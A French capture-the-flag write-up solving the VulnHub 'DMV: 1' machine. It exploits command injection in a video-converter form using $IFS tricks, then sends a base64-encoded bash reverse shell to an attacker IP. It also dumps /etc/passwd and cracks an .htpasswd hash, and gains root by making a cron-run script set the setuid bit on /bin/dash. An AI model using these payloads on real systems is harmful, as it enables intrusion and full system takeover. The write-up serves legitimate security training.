# Solution du CTF DMV #1 de VulnHub

[DMV: 1](https://www.vulnhub.com/entry/dmv-1,462/) est le premier CTF d'une série créé par [Jonathan Toledo](https://twitter.com/over_jt).

La description est la suivante :

> It is a simple machine that replicates a real scenario that I found.
> 
> The goal is to get two flags, one that is in the secret folder and the other that can only be read by the root user

```
Nmap scan report for 192.168.56.68
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 651bfc741039dfddd02df0531ceb6dec (RSA)
|   256 c42804a5c3b96a955a4d7a6e46e214db (ECDSA)
|_  256 ba07bbcd424af293d105d0b34cb1d9b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

## Youteubé

On a donc ce site web qui ressemble beaucoup à des sites existants permettant d'obtenir un rip pour une vidéo YouTube. La page n'a pas de tag `form` défini pourtant quand on remplit et soumet des données on peut voir (via les developper tools) une requête passer.

```html
         <h3>Convert My Video</h3>
         <label for="ytid">Video ID:</label><input type="text" id="ytid" name="ytid">
         <button type="button" id="convert">Convert!</button>
```

C'est parce que la logique est présente dans un code JS qui est chargé :

```js

$(function () {
    $("#convert").click(function () {
        $("#message").html("Converting...");
        $.post("/", { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() }, function (data) {
            try {
                data = JSON.parse(data);
                if(data.status == "0"){
                    $("#message").html("<a href='" + data.result_url + "'>Download MP3</a>");
                }
                else{
                    console.log(data);
                    $("#message").html("Oops! something went wrong");
                }
            } catch (error) {
                console.log(data);
                $("#message").html("Oops! something went wrong");
            }
        });
    });

});
```

Quoiqu'il en soit si je saisi un guillemet dans le champ de texte j'obtiens la réponse suivante pour la requête Ajax :

```json
{"status":2,"errors":"sh: 1: Syntax error: Unterminated quoted string\n","url_orginal":"https:\/\/www.youtube.com\/watch?v=\"'","output":"","result_url":"\/tmp\/downloads\/63875bad67c74.mp3"}
```

Une erreur de syntaxe bash... donc exécution de commande. Un point virgule peut suffire à échapper la commande en cours mais ça fonctionne aussi avec les backticks. Exemple avec la commande ````id```` :

```json
{
  "status":1,
  "errors":"WARNING: Assuming --restrict-filenames since --- snip --- Could not send HEAD request to https:\/\/www.youtube.com\/watch?v=uid=33(www-data): <urlopen error [Errno -3] Temporary failure in name resolution>\nERROR: Unable to download webpage: <urlopen error [Errno -3] Temporary failure in name resolution> (caused by URLError(gaierror(-3, 'Temporary failure in name resolution'),))\n","url_orginal":"https:\/\/www.youtube.com\/watch?v=`id`","output":"[generic] watch?v=uid=33(www-data): Requesting header\n[generic] watch?v=uid=33(www-data): Downloading webpage\n","result_url":"\/tmp\/downloads\/63875c3149f3b.mp3"}
```

On voit que la commande a été exécutée même si on a juste une partie de l'output (visiblement tronqué au premier espace). De même si on demande `ls -al` il semble que seul le début de la commande passe, tronquée elle aussi au premier espace. Il faut donc essayer de passer outre ça et la solution est généralement la variable d'environmment `IFS` qui contient un whitespace.

Ainsi si je saisi `;ls""$IFS"-la"$IFS/;)` j'obtiens le listing espéré :

`total 2017384\ndrwxr-xr-x  24 root root       4096 Apr 12  2020 .\ndrwxr-xr-x  24 root root       4096 Apr 12  2020 ..\ndrwxr-xr-x   2 root root       4096 Apr 12  2020 bin\n`

etc, etc. Pour éviter à avoir à gérer trop de cas d'espaces je vais me contenter d'encoder la commande finale en base64 et je passerais au script une commande qui la décode et la passe à `bash`.

D'abord obtenir la commande de reverse-shell en base64 :

```bash
echo 'bash -i >& /dev/tcp/192.168.56.1/9999 0>&1' | base64 -w0
```

Je met le résultat avec les `$IFS` et chaines vides nécessaires :

```bash
echo""$IFS""YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEvOTk5OSAwPiYxCg==""|base64""$IFS""-d|bash
```

On passe le tout avec les points viirgules de part et d'autre et ça mord :

```shellsession
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.68.
Ncat: Connection from 192.168.56.68:58648.
bash: cannot set terminal process group (908): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dmv:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@dmv:/var/www/html$ which python2 python3 python
which python2 python3 python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python
www-data@dmv:/var/www/html$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@dmv:/var/www/html$ ls
ls
admin  images  index.php  js  style.css  tmp
www-data@dmv:/var/www/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
dmv:x:1000:1000:dmv:/home/dmv:/bin/bash
```

Je trouve le premier flag dans un dossier de la racine web :

```shellsession
$ cat /var/www/html/admin/flag.txt
cat /var/www/html/admin/flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

Mais pas que, on trouve aussi un fichier `.htpasswd` :

`itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/`

Il se cracke rapidement :

`jessie           (itsmeadmin)`

Mais il ne semble utilisable ni pour root ni pour le compte dmv présent sur le système.

## Autopspy

`LinPEAS` ne trouvant rien de particulier (il y a la faille sudo toutefois), je rapaptrie et exécute pspy pour espionner l'activité du système.

Je remarque une tache planifiée exécutée par root :

```bash
2022/11/30 15:37:01 CMD: UID=0    PID=27335  | bash /var/www/html/tmp/clean.sh 
2022/11/30 15:37:01 CMD: UID=0    PID=27334  | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh
```

Or le script nous appartient :

`-rw-r--r-- 1 www-data www-data 17 Apr 12  2020 /var/www/html/tmp/clean.sh`

Je rajoute juste cette ligne en début de fichier :

```bash
chmod 4755 /bin/dash
```

Après une minute c'est dans la poche :

```shellsession
www-data@dmv:/tmp$ ls -al /bin/dash
-rwsr-xr-x 1 root root 119K Jan 25  2018 /bin/dash
www-data@dmv:/tmp$ /bin/dash -p
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cd /root
# ls
root.txt
# cat root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```

Scénario intéressant, j'ai moi même déjà du faire face à cette problématique de tronquage :)
